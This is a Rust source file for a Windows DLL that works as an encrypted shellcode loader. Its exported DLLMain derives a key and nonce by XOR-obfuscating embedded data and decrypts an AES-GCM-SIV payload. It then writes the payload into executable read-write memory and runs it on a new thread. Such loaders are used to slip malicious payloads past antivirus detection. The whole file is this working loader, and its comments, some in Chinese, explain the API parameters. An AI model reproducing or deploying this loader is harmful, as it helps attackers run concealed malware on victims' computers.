use std::error::Error;
use std::ptr;
use std::slice;
use std::ffi::c_void;
use aes_gcm_siv::{Aes256GcmSiv, Key, KeyInit, Nonce};
use aes_gcm_siv::aead::Aead;
use windows::Win32::System::Memory;
use windows::Win32::Foundation;
use windows::Win32::Foundation::{WAIT_EVENT, WIN32_ERROR};
use windows::Win32::System::Threading;

// mod crate::data_tmp;
#[path = "data_tmp.rs"] mod data_tmp;
// use openssl::symm::{decrypt, Cipher};

pub struct DistributeMemory {
	len: usize,
	ptr: *mut u8,
}

impl Drop for DistributeMemory {
	fn drop(&mut self) {
		unsafe{
			let _ = Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
		}
	}
}

impl DistributeMemory {
	fn new(len: usize) -> Result<DistributeMemory, WIN32_ERROR> {
		let mut memory = DistributeMemory {
			len,
			ptr: ptr::null_mut(),
		};
		
		unsafe {
			memory.ptr = Memory::VirtualAlloc(
				Some(ptr::null()),
				//memory address to distribute
				len,
				//memory size
				Memory::MEM_COMMIT | Memory::MEM_RESERVE,
				//alloc type
				Memory::PAGE_EXECUTE_READWRITE,
				//protect attribute
			) as *mut u8;
		};
		
		if memory.ptr.is_null() {
			Err( unsafe{ Foundation::GetLastError()} )
		} else {
			Ok(memory)
		}
	}
	
	pub fn as_slice_mut(&mut self) -> &mut[u8] {
		unsafe { slice::from_raw_parts_mut(self.ptr, self.len) }//turn pointer to mut slice
	}
	
	pub fn as_ptr(&self) -> *mut u8 {
		self.ptr
	}
}

pub struct Thread {
	handle: Foundation::HANDLE,
	tid: u32,
}

impl Drop for Thread {
	fn drop(&mut self) {
		unsafe { let _ = Foundation::CloseHandle(self.handle); };
	}
}

impl Thread {
	pub unsafe fn run(start: *const u8) -> Result<Thread, WIN32_ERROR> {
		let mut th = Thread {
			handle: Foundation::HANDLE(0),
			tid: 0,
		};
		
		let ep: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(start) };
		
		// th.handle = Threading::CreateThread(
		// 	ptr::null_mut(),
		// 	//thread protect attribute
		// 	0,
		// 	//stack attribute
		// 	Some(ep),
		// 	//pointer to thread func
		// 	ptr::null_mut(),
		// 	//prama to thread func
		// 	windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
		// 	//thread create flags
		// 	&mut th.tid,
		// 	//thread id
		// ).unwrap();

		// https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
		th.handle = Threading::CreateThread(
			Some(ptr::null()),  
			//  如果 lpThreadAttributes 为 NULL，则线程将获取默认的安全描述符。
			0,
			// 堆栈的初始大小（以字节为单位）。 系统将此值舍入到最近的页面。 如果此参数为零，新线程将使用可执行文件的默认大小。 
			Some(ep),
			// 指向一个线程函数地址。每个线程都有自己的线程函数，线程函数是线程具体的执行代码。
			Some(ptr::null()),
			// 指向要传递给线程的变量的指针。
			windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0), 
			// 控制线程创建的标志。 0 表示立即执行。
			Some(&mut th.tid)
            // 指向接收线程标识符的变量的指针。 如果此参数为 NULL，则不返回线程标识符。
        ).unwrap();
		if th.handle == Foundation::HANDLE(0) {
			Err(Foundation::GetLastError())
		} else {
			Ok(th)
		}
	}
	
	pub fn wait(&self) -> Result<(), WIN32_ERROR> {
		let status = unsafe { Threading::WaitForSingleObject(self.handle, Threading::INFINITE) };
		if status == WAIT_EVENT(0) {
			Ok(())
		} else {
			Err( unsafe{Foundation::GetLastError()} )
		}
	}
}


/// aes-gcm-siv 解密
/// data - [u8]
/// key - [u8;32]
/// nonce - [u8;12]
fn aes_gcm_siv_dec(data: &[u8], key: &[u8], nonce: &[u8]) -> Result<Vec<u8>,Box<dyn Error>> {
	let key: &Key<Aes256GcmSiv> = key.into();
	let cipher = Aes256GcmSiv::new(&key);
	let nonce = Nonce::from_slice(nonce);

	let plaintext = cipher.decrypt(nonce, data).unwrap();
	Ok(plaintext)
}

pub fn run(shellcode: Vec<u8>) -> Result<(), WIN32_ERROR> {
	let mut me = DistributeMemory::new(shellcode.len())?;
	let ms = me.as_slice_mut();
	ms[..shellcode.len()].copy_from_slice(shellcode.as_slice());
	let t = unsafe {
		Thread::run(me.as_ptr())
	}?;
	t.wait()
}

#[no_mangle]
pub extern fn DLLMain() {
	let (d1, d2, d3, d4) = data_tmp::getdata();

    // 简单混淆
    let newnonce: [u8; 12] = d3
        .into_iter()
        .zip(d2.clone())
        .map(|(a, b)| a ^ b ^ 5 << 1)
        .collect::<Vec<u8>>()
        .as_slice()
        .try_into()
        .unwrap();
    let newkey: [u8; 32] = d2
        .into_iter()
        .zip(d4)
        .map(|(a, b)| a ^ b ^ 5 >> 1)
        .collect::<Vec<u8>>()
        .as_slice()
        .try_into()
        .unwrap();

    // let cipher = Cipher::aes_256_cbc();
    // let plaintext = decrypt(cipher, &newkey, Some(&newiv), d1.as_slice()).unwrap();
	let plaintext = aes_gcm_siv_dec(d1.as_slice(),&newkey,&newnonce).unwrap();

    let _ = run(plaintext);
}